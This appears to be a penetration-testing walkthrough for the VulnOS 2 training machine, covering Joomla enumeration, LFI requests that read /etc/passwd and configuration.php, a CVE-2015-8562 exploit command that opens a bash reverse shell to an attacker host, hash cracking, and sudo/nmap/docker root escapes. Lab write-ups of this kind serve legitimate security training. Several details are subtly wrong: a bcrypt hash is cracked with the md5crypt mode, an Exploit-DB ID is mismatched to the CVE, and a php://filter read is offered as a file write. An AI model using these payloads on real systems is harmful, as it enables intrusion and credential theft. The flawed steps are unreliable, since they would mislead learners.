# VulnOS 2: OSCP Walkthrough

**Machine:** VulnOS 2
**Difficulty:** Easy / Medium (Web Exploitation Heavy)
**Category:** Web Exploitation → Joomla CMS → Privilege Escalation
**OS:** Linux
**Download:** https://www.vulnhub.com/entry/vulnos-2,32/
**VulnHub Group:** VulnOS 2

---

## 🔍 Reconnaissance

### Network Scanning

```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Open Ports:**
| Port  | Service  | Version / Details                          |
|-------|----------|--------------------------------------------|
| 22    | SSH      | OpenSSH                                    |
| 80    | HTTP     | Apache httpd + PHP                         |
| 3306  | MySQL    | MySQL (may be exposed or localhost-only)   |

> VulnOS 2 is a Joomla-based machine with web exploitation as the primary attack vector. The web service is the main focus of enumeration and exploitation.

### Quick Recon Commands

```bash
# Full nmap scan
nmap -sV -sC -A -p- <TARGET_IP>

# Web server headers
curl -I http://<TARGET_IP>

# Check for default page / Joomla indicator
curl http://<TARGET_IP>
```

---

## 🌐 Web Enumeration

### CMS Detection & Version Finding

```bash
# WhatWeb - detects Joomla and version
whatweb http://<TARGET_IP>

# CMSeek - advanced CMS fingerprinting
cmseek -u http://<TARGET_IP>/

# OWASP JoomScan - dedicated Joomla scanner
joomscan --url http://<TARGET_IP>

# JoomScan with component enumeration
joomscan --url http://<TARGET_IP> --enumerate-components

# JoomScan with random user-agent (avoid blocking)
joomscan --url http://<TARGET_IP> --random-agent
```

### Directory Bruteforcing

```bash
# Gobuster
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40

# Feroxbuster (faster)
feroxbuster -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

# Dirsearch
dirsearch -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### Key Directories & Files to Check

```bash
# robots.txt - reveals hidden paths
curl http://<TARGET_IP>/robots.txt

# Joomla administrator panel
curl http://<TARGET_IP>/administrator/

# Joomla XML version files (often leaked)
curl http://<TARGET_IP>/language/en-GB/en-GB.xml
curl http://<TARGET_IP>/administrator/manifests/files/joomla.xml

# Backup files (often left behind)
curl http://<TARGET_IP>/backup.tar.gz
curl http://<TARGET_IP>/site.zip
curl http://<TARGET_IP>/joomla.sql

# Configuration file (may contain credentials)
curl http://<TARGET_IP>/configuration.php
curl http://<TARGET_IP>/configuration.php.bak
curl http://<TARGET_IP>/configuration.php~

# Check for phpMyAdmin
curl http://<TARGET_IP>/phpmyadmin/

# Feed endpoint (may leak version)
curl "http://<TARGET_IP>/index.php?format=feed"
```

### Joomla-Specific Enumeration

```bash
# Check Joomla version from HTML meta tag
curl -s http://<TARGET_IP> | grep -i "generator"

# Default Joomla installation often shows version in HTML source
# <meta name="generator" content="Joomla! - Open Source Content Management" />

# Check for known vulnerable components
# Common vulnerable Joomla components:
#   com_hdflvplayer (LFI)
#   com_jdownloads (LFI/RFI)
#   com_phocagallery (LFI)
#   com_foxyprint (LFI)
#   com_arkownloader (RFI)

# Test for LFI in common components
curl "http://<TARGET_IP>/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../../../../../../etc/passwd"

# Check /tmp/ and /cache/ for uploaded files
curl http://<TARGET_IP>/tmp/
curl http://<TARGET_IP>/cache/
```

### User Enumeration

```bash
# Joomla registration page (may reveal if user registration is enabled)
curl http://<TARGET_IP>/index.php?option=com_users&view=registration

# Login page error messages (may indicate valid usernames)
# Try common Joomla usernames: admin, administrator, root, test, user
```

---

## 🎯 Exploitation

### Step 1: Version Detection & Vulnerability Matching

Once Joomla version is identified, search for known exploits:

```bash
# Search exploit-db for your Joomla version
searchsploit joomla <version>

# Example: Joomla 3.x (common in VulnOS 2)
searchsploit joomla 3
```

### Step 2: Exploit CVE-2015-8562 (PHP Object Injection → RCE)

Vulnerable Joomla 1.5 through 3.4.5 is susceptible to RCE via malicious HTTP headers.

```bash
# Download the exploit from Exploit-DB
searchsploit -m 37265

# Or get the raw exploit script
wget https://www.exploit-db.com/raw/37265 -O joomla_rce.py
```

The exploit leverages the `User-Agent` or `X-Forwarded-For` HTTP header to inject serialized PHP objects that trigger RCE.

```bash
# Usage
python joomla_rce.py http://<TARGET_IP>
# Or with command execution
python joomla_rce.py http://<TARGET_IP> -c "whoami"
```

### Step 3: LFI via com_hdflvplayer

If the `com_hdflvplayer` component is installed, exploit Local File Inclusion:

```bash
# Read /etc/passwd via LFI
curl "http://<TARGET_IP>/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../../../../../../etc/passwd"

# Read Joomla configuration.php to get database credentials
curl "http://<TARGET_IP>/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../../../../../../configuration.php"
```

### Step 4: Extract Database Credentials from configuration.php

```bash
# From the LFI response, extract:
# $host = 'localhost';
# $user = 'root';
# $password = '<password>';
# $db = 'joomla_db';
# $dbprefix = 'armo_'; (or similar)
```

### Step 5: Access phpMyAdmin or MySQL Directly

**Option A: phpMyAdmin (if exposed)**
```bash
# Browse to phpMyAdmin
# http://<TARGET_IP>/phpmyadmin/
# Login with extracted DB credentials:
# Username: root
# Password: <from configuration.php>
```

**Option B: Direct MySQL connection**
```bash
# Connect to MySQL if port 3306 is accessible
mysql -h <TARGET_IP> -u root -p<password>

# Inside MySQL:
SHOW DATABASES;
USE joomla_db;
SHOW TABLES;
SELECT * FROM joomla_users;
```

### Step 6: Admin Password Hash Cracking

```bash
# Export the admin password hash from the database
SELECT username, password FROM joomla_users;

# Save hashes to file
echo "admin:$2y$10$<hash_from_db>" > hashes.txt

# Crack with hashcat (GPU accelerated)
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt

# Or use john the ripper
john --format=md5crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> The Joomla `password` field uses PHPass / md5crypt (hashcat mode 400).

### Step 7: Reverse Shell / Web Shell

**Method A: Upload shell via Joomla template or vulnerability**

If you can upload files (through a vulnerable component or admin panel):

```bash
# Create a PHP reverse shell
# Upload via Joomla template editor or vulnerable component
# Then access the uploaded shell
curl http://<TARGET_IP>/templates/<template>/shell.php
```

**Method B: Use Joomla RCE exploit for shell**

```bash
# CVE-2015-8562 allows command execution directly
python joomla_rce.py http://<TARGET_IP> -c "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

**Method C: Use LFI to upload a web shell**

```bash
# If file write via LFI is possible
curl "http://<TARGET_IP>/components/com_hdflvplayer/hdflvplayer/download.php?f=php://filter/convert.base64-decode/resource=../../../../../../../../templates/<template>/shell.php"
```

### Step 8: SSH with Cracked or Found Credentials

```bash
# Try credentials found during exploitation
ssh admin@<TARGET_IP>
# Password: <cracked from Joomla admin hash>

ssh root@<TARGET_IP>
# Password: <if found in configuration.php or database>
```

---

## 🔐 Privilege Escalation

### Once Inside (Initial User Shell)

```bash
# Basic recon
whoami
id
uname -a
cat /etc/os-release
```

### Enumeration Commands

```bash
# Sudo permissions
sudo -l

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# Capabilities
getcap -r / 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files in sensitive directories
find /etc -writable -type f 2>/dev/null
find /usr/bin -writable -type f 2>/dev/null

# Password history
cat ~/.bash_history
cat /root/.bash_history
cat /home/*/.bash_history

# Check for docker
docker --version 2>/dev/null && docker ps -a 2>/dev/null

# Check for password in config files
find / -name ".env" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# Check web root for backup files
find /var/www -name "*.bak" -o -name "*.zip" -o -name "*.tar.gz" -o -name "*.sql" 2>/dev/null

# Check for writable files in web root
find /var/www -writable -type f 2>/dev/null

# Check for private SSH keys
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null

# GTFOBins lookup
# https://gtfobins.github.io/
```

### Common Privesc Paths for VulnOS 2

1. **Passwordless sudo for a specific script:**
   ```bash
   sudo -l
   # If something like: (ALL) NOPASSWD: /usr/bin/python /home/user/script.py
   sudo /usr/bin/python /home/user/script.py
   ```

2. **Writable cron job or systemd service:**
   ```bash
   # If a cron job runs a writable script as root
   # Replace the script content with a reverse shell or add SSH key to /root/.ssh/authorized_keys
   ```

3. **GTFOBins for installed tools:**
   - Check `nmap`, `vim`, `find`, `python`, `perl`, `awk`, `systemctl`, `docker` for GTFOBins entries
   - Example with `nmap`:
     ```bash
     sudo nmap --interactive
     !sh
     ```

4. **Docker exploitation (if docker is available):**
   ```bash
   # If user can run docker commands
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```

5. **Abuse sudo for less/sudoedit:**
   ```bash
   sudo less /etc/shadow
   # Inside less: !/bin/sh
   ```

---

## 📸 Screenshots

*No screenshots available for this machine.*

---

## ✅ Key Takeaways

- **VulnOS 2 is a Joomla-centric machine**: focus on CMS enumeration and web exploitation.
- **Joomla version detection** is critical; different versions have different exploits available.
- **CVE-2015-8562** is the classic Joomla RCE: always test it first on vulnerable Joomla versions.
- **LFI via vulnerable components** (such as `com_hdflvplayer`) can leak `configuration.php` containing database credentials.
- **phpMyAdmin** is a common misconfiguration on VulnOS machines; always check for it.
- **Web shells are more reliable than reverse shells** on Joomla machines since file upload is often part of the CMS functionality.
- **Hash cracking** (Joomla uses PHPass/md5crypt) is a key step: save hashes and use hashcat with wordlists.
- **After initial shell, always do thorough sudo and SUID enumeration**: Joomla machines often have simple privesc paths.

**Machine: VulnOS 2 [✅/❌ Pending]**

---

M4d3 w1th ❤️ by Ankit Patidar
